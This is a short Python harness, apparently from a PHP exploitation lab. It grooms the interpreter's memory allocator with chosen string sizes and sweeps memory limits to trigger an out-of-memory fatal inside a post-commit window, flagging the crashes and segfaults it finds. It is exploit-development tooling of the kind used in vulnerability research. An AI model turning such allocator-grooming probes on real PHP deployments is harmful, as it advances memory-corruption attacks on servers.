#!/usr/bin/env python3
"""oom38: binned-tmp kill — name 3064: tmp1=3072, tmp2=3066 (3072-bin, never
touch the page carver), key=3090 (1 page from carver). Per-part carver asks:
fill(4096) then KEY. Countdown C: C=1 -> fill takes last page, tmps binned,
KEY asks empty carver -> chunk refused -> FATAL INSIDE POST-COMMIT WINDOW.
Detector: keycommit without following keyok / RC 139.
usage: oom38.py [lo] [hi] [step]
"""
import re
import sys

exec(open("/tmp/phplab/oom33.py").read().replace('if __name__ == "__main__":', 'if False:'))

NAMELEN = 3064  # tmp1 3072 (bin), tmp2 3066 (bin), key 3090 (page)


def decode_lim(limit, build):
    rc, tr = run(build(), limit)
    commits = [(m.start(), m.group(2), m.group(3))
               for m in re.finditer(r"TRACE keycommit stage=(\d+) elem=(\d+) free=(\d+)", tr)]
    ok_positions = [m.start() for m in re.finditer(r"TRACE keyok", tr)]
    last = commits[-1] if commits else None
    key_death = last is not None and not any(p > last[0] for p in ok_positions)
    tried = re.findall(r"tried to allocate (\d+) bytes", tr)
    rcnum = rc.replace("RC=", "")
    if key_death or rcnum == "139":
        i = tr.rfind("TRACE keycommit")
        print("lim=%d rc=%s *** KEY DEATH elem=%s free=%s tried=%s ***" %
              (limit, rcnum, last[1], last[2], tried[-1] if tried else "-"), flush=True)
        ctx = [l for l in tr[max(0, i - 700):i + 300].splitlines()
               if ("TRACE" in l or "tried" in l or "Allowed" in l)][-14:]
        print("\n".join(ctx))
        print("---")
        return True
    tag = "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive"
    print("lim=%d rc=%s %s commits=%d oks=%d" %
          (limit, rcnum, tag, len(commits), len(ok_positions)), flush=True)
    return False


if __name__ == "__main__":
    lo = int(sys.argv[1]) if len(sys.argv) > 1 else 20_600_000
    hi = int(sys.argv[2]) if len(sys.argv) > 2 else 21_100_000
    step = int(sys.argv[3]) if len(sys.argv) > 3 else 4096
    build = make_builder(NAMELEN)
    for lim in range(lo, hi + 1, step):
        if decode_lim(lim, build):
            break
